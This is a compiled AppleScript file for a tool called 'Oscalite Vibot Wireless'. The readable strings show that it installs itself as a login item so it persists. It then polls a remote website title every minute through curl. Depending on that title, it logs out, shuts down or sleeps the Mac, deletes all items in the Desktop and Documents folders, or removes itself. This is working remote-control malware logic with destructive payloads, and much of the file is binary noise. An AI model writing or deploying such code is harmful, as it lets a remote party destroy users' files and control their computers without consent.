FasdUAS 1.101.10   ��   ��    k             l     ��  ��    9 3 Oscalite Vibot Wireless - Developed by Jordan Fung     � 	 	 f   O s c a l i t e   V i b o t   W i r e l e s s   -   D e v e l o p e d   b y   J o r d a n   F u n g   
  
 l     ��  ��    #  Version 1.0W - July 15, 2015     �   :   V e r s i o n   1 . 0 W   -   J u l y   1 5 ,   2 0 1 5      l     ��  ��    U O Description: Coded in AppleScript. Control the user's Mac using website title.     �   �   D e s c r i p t i o n :   C o d e d   i n   A p p l e S c r i p t .   C o n t r o l   t h e   u s e r ' s   M a c   u s i n g   w e b s i t e   t i t l e .      l     ��  ��    9 3 Released under the GNU General Public License v3.0     �   f   R e l e a s e d   u n d e r   t h e   G N U   G e n e r a l   P u b l i c   L i c e n s e   v 3 . 0      l     ��������  ��  ��        l     ��  ��      Start of AppleScript     �   *   S t a r t   o f   A p p l e S c r i p t     !   l     ��������  ��  ��   !  " # " i      $ % $ I      �� &���� "0 checkloginitems checkLoginItems &  ' ( ' o      ���� 0 appname appName (  )�� ) 1      ��
�� 
ppth��  ��   % k     A * *  + , + l     ��������  ��  ��   ,  - . - l     �� / 0��   / 3 -Get all login items and store them as strings    0 � 1 1 Z G e t   a l l   l o g i n   i t e m s   a n d   s t o r e   t h e m   a s   s t r i n g s .  2 3 2 O      4 5 4 r     6 7 6 c     8 9 8 n    	 : ; : 1    	��
�� 
pnam ; 2    ��
�� 
logi 9 m   	 
��
�� 
TEXT 7 o      ���� 0 allloginitems allLoginItems 5 m      < <�                                                                                  sevs  alis    �  Macintosh HD               �	&H+     2System Events.app                                                �ЏN�        ����  	                CoreServices    ���      Ў�a       2   &   %  =Macintosh HD:System: Library: CoreServices: System Events.app   $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��   3  = > = l   ��������  ��  ��   >  ? @ ? l   �� A B��   A 9 3 Check if the application exists in the login items    B � C C f   C h e c k   i f   t h e   a p p l i c a t i o n   e x i s t s   i n   t h e   l o g i n   i t e m s @  D E D Z    ? F G�� H F E    I J I o    ���� 0 allloginitems allLoginItems J o    ���� 0 appname appName G k     K K  L M L l   �� N O��   N   Do nothing if true    O � P P &   D o   n o t h i n g   i f   t r u e M  Q�� Q l   ��������  ��  ��  ��  ��   H k    ? R R  S T S r    " U V U n      W X W 1     ��
�� 
psxp X 4    �� Y
�� 
alis Y 1    ��
�� 
ppth V o      ���� 0 apppath appPath T  Z [ Z l  # #��������  ��  ��   [  \ ] \ l  # #�� ^ _��   ^ $  Add a new login item if false    _ � ` ` <   A d d   a   n e w   l o g i n   i t e m   i f   f a l s e ]  a b a O   # = c d c k   ' < e e  f g f I  ' 6�� h i
�� .corecrel****      � null h m   ' (��
�� 
logi i �� j k
�� 
insh j  ;   ) + k �� l��
�� 
prdt l K   , 2 m m �� n o
�� 
ppth n o   - .���� 0 apppath appPath o �� p��
�� 
hidn p m   / 0��
�� boovfals��  ��   g  q r q l  7 7�� s t��   s   delay 30 seconds    t � u u "   d e l a y   3 0   s e c o n d s r  v�� v I  7 <�� w��
�� .sysodelanull��� ��� nmbr w m   7 8���� ��  ��   d m   # $ x x�                                                                                  sevs  alis    �  Macintosh HD               �	&H+     2System Events.app                                                �ЏN�        ����  	                CoreServices    ���      Ў�a       2   &   %  =Macintosh HD:System: Library: CoreServices: System Events.app   $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��   b  y�� y l  > >��������  ��  ��  ��   E  z�� z l  @ @��������  ��  ��  ��   #  { | { l     ��������  ��  ��   |  } ~ } l     ��  ���    ' ! Get the path of this application    � � � � B   G e t   t h e   p a t h   o f   t h i s   a p p l i c a t i o n ~  � � � l    	 ����� � r     	 � � � l     ����� � I    �� � �
�� .earsffdralis        afdr �  f      � �� ���
�� 
rtyp � m    ��
�� 
TEXT��  ��  ��   � o      ���� 0 app_path  ��  ��   �  � � � l     ��������  ��  ��   �  � � � l     �� � ���   �   Call checkLoginItems    � � � � *   C a l l   c h e c k L o g i n I t e m s �  � � � l  
  ����� � n  
  � � � I    �� ����� "0 checkloginitems checkLoginItems �  � � � m     � � � � � . O s c a l i t e   V i b o t   W i r e l e s s �  ��� � o    ���� 0 app_path  ��  ��   �  f   
 ��  ��   �  � � � l     ��������  ��  ��   �  � � � l   � ����� � T    � � � k    � � �  � � � l   ��������  ��  ��   �  � � � l   �� � ���   � #  Get the title of the website    � � � � :   G e t   t h e   t i t l e   o f   t h e   w e b s i t e �  � � � r     � � � I   �� ���
�� .sysoexecTEXT���     TEXT � m     � � � � � � / u s r / b i n / c u r l   ' h t t p : / / w w w . U R L t o C h e c k . c o m '   |   / u s r / b i n / a w k   ' / < t i t l e > / '   |   / u s r / b i n / c u t   - d   ' > '   - f   2   |   / u s r / b i n / c u t   - d   ' < '   - f   1��   � o      ���� 	0 title   �  � � � l   ��������  ��  ��   �  � � � l   �� � ���   � ) # Check if it is any of the commands    � � � � F   C h e c k   i f   i t   i s   a n y   o f   t h e   c o m m a n d s �  � � � Z    � � � ��� � =   " � � � o     ���� 	0 title   � m     ! � � � � �  l o g o u t � k   % 1 � �  � � � l  % %�� � ���   �   Log out the computer    � � � � *   L o g   o u t   t h e   c o m p u t e r �  � � � O   % / � � � I  ) .������
�� .fndrlogonull��� ��� null��  ��   � m   % & � ��                                                                                  sevs  alis    �  Macintosh HD               �	&H+     2System Events.app                                                �ЏN�        ����  	                CoreServices    ���      Ў�a       2   &   %  =Macintosh HD:System: Library: CoreServices: System Events.app   $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��   �  ��� � l  0 0��������  ��  ��  ��   �  � � � =  4 7 � � � o   4 5���� 	0 title   � m   5 6 � � � � �  s h u t d o w n �  � � � k   : F � �  � � � l  : :�� � ���   � !  Shut down the computer if     � � � � 6   S h u t   d o w n   t h e   c o m p u t e r   i f   �  � � � O   : D � � � I  > C������
�� .fndrshutnull��� ��� null��  ��   � m   : ; � ��                                                                                  sevs  alis    �  Macintosh HD               �	&H+     2System Events.app                                                �ЏN�        ����  	                CoreServices    ���      Ў�a       2   &   %  =Macintosh HD:System: Library: CoreServices: System Events.app   $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��   �  ��� � l  E E��������  ��  ��  ��   �  � � � =  I L � � � o   I J���� 	0 title   � m   J K � � � � � 
 s l e e p �  � � � k   O [ � �  � � � l  O O�� � ���   �   Turn Mac to sleep mode    � � � � .   T u r n   M a c   t o   s l e e p   m o d e �  � � � O   O Y � � � I  S X��~�}
� .fndrslepnull��� ��� null�~  �}   � m   O P � ��                                                                                  MACS  alis    t  Macintosh HD               �	&H+     2
Finder.app                                                      Y��t�        ����  	                CoreServices    ���      ��k       2   &   %  6Macintosh HD:System: Library: CoreServices: Finder.app   
 F i n d e r . a p p    M a c i n t o s h   H D  &System/Library/CoreServices/Finder.app  / ��   �  ��| � l  Z Z�{�z�y�{  �z  �y  �|   �  � � � =  ^ c � � � o   ^ _�x�x 	0 title   � m   _ b � � � � �  d e s k t o p �  � � � k   f � � �  �  � l  f f�w�w   ( " Delete all item in Desktop folder    � D   D e l e t e   a l l   i t e m   i n   D e s k t o p   f o l d e r   O   f  I  j ~�v�u
�v .coredeloobj        obj  l  j z	�t�s	 n   j z

 2   v z�r
�r 
cobj 4   j v�q
�q 
cfol l  n u�p�o I  n u�n�m
�n .earsffdralis        afdr m   n q�l
�l afdmdesk�m  �p  �o  �t  �s  �u   m   f g�                                                                                  MACS  alis    t  Macintosh HD               �	&H+     2
Finder.app                                                      Y��t�        ����  	                CoreServices    ���      ��k       2   &   %  6Macintosh HD:System: Library: CoreServices: Finder.app   
 F i n d e r . a p p    M a c i n t o s h   H D  &System/Library/CoreServices/Finder.app  / ��   �k l  � ��j�i�h�j  �i  �h  �k   �  =  � � o   � ��g�g 	0 title   m   � � �  d o c u m e n t  k   � �  l  � ��f�f   ) # Delete all item in Document folder    � F   D e l e t e   a l l   i t e m   i n   D o c u m e n t   f o l d e r   O   � �!"! I  � ��e#�d
�e .coredeloobj        obj # l  � �$�c�b$ n   � �%&% 2   � ��a
�a 
cobj& 4   � ��`'
�` 
cfol' l  � �(�_�^( I  � ��])�\
�] .earsffdralis        afdr) m   � ��[
�[ afdrdocs�\  �_  �^  �c  �b  �d  " m   � �**�                                                                                  MACS  alis    t  Macintosh HD               �	&H+     2
Finder.app                                                      Y��t�        ����  	                CoreServices    ���      ��k       2   &   %  6Macintosh HD:System: Library: CoreServices: Finder.app   
 F i n d e r . a p p    M a c i n t o s h   H D  &System/Library/CoreServices/Finder.app  / ��    +�Z+ l  � ��Y�X�W�Y  �X  �W  �Z   ,-, =  � �./. o   � ��V�V 	0 title  / m   � �00 �11  u n i n s t a l l- 2�U2 k   � �33 454 l  � ��T67�T  6   Uninstall Oscalite Vibot   7 �88 2   U n i n s t a l l   O s c a l i t e   V i b o t5 9:9 O   � �;<; I  � ��S=�R
�S .coredeloobj        obj = l  � �>�Q�P> I  � ��O?�N
�O .earsffdralis        afdr?  f   � ��N  �Q  �P  �R  < m   � �@@�                                                                                  MACS  alis    t  Macintosh HD               �	&H+     2
Finder.app                                                      Y��t�        ����  	                CoreServices    ���      ��k       2   &   %  6Macintosh HD:System: Library: CoreServices: Finder.app   
 F i n d e r . a p p    M a c i n t o s h   H D  &System/Library/CoreServices/Finder.app  / ��  : A�MA l  � ��L�K�J�L  �K  �J  �M  �U  ��   � BCB l  � ��I�H�G�I  �H  �G  C DED l  � ��FFG�F  F ( " Delay 60 seconds until next check   G �HH D   D e l a y   6 0   s e c o n d s   u n t i l   n e x t   c h e c kE IJI I  � ��EK�D
�E .sysodelanull��� ��� nmbrK m   � ��C�C <�D  J L�BL l  � ��A�@�?�A  �@  �?  �B  ��  ��   � MNM l     �>�=�<�>  �=  �<  N O�;O l     �:PQ�:  P  End of AppleScript   Q �RR $ E n d   o f   A p p l e S c r i p t�;       �9STU�9  S �8�7�8 "0 checkloginitems checkLoginItems
�7 .aevtoappnull  �   � ****T �6 %�5�4VW�3�6 "0 checkloginitems checkLoginItems�5 �2X�2 X  �1�0�1 0 appname appName
�0 
ppth�4  V �/�.�-�,�/ 0 appname appName
�. 
ppth�- 0 allloginitems allLoginItems�, 0 apppath appPathW  <�+�*�)�(�'�&�%�$�#�"�!� �
�+ 
logi
�* 
pnam
�) 
TEXT
�( 
alis
�' 
psxp
�& 
insh
�% 
prdt
�$ 
ppth
�# 
hidn�" 
�! .corecrel****      � null�  
� .sysodelanull��� ��� nmbr�3 B� *�-�,�&E�UO�� hY (*�E/�,E�O� ��*6���f�� O�j UOPOPU �Y��Z[�
� .aevtoappnull  �   � ****Y k     �\\  �]]  �^^  ���  �  �  Z  [ ���� �� ��� � �� �� � �� ������0�
�	
� 
rtyp
� 
TEXT
� .earsffdralis        afdr� 0 app_path  � "0 checkloginitems checkLoginItems
� .sysoexecTEXT���     TEXT� 	0 title  
� .fndrlogonull��� ��� null
� .fndrshutnull��� ��� null
� .fndrslepnull��� ��� null
� 
cfol
� afdmdesk
� 
cobj
� .coredeloobj        obj 
� afdrdocs�
 <
�	 .sysodelanull��� ��� nmbr� �)��l E�O)��l+ O �hZ�j E�O��  � *j UOPY ���  � *j UOPY ��  � *j UOPY j�a    � *a a j /a -j UOPY D�a    � *a a j /a -j UOPY �a   � )j j UOPY hOa j OP[OY�Cascr  ��ޭ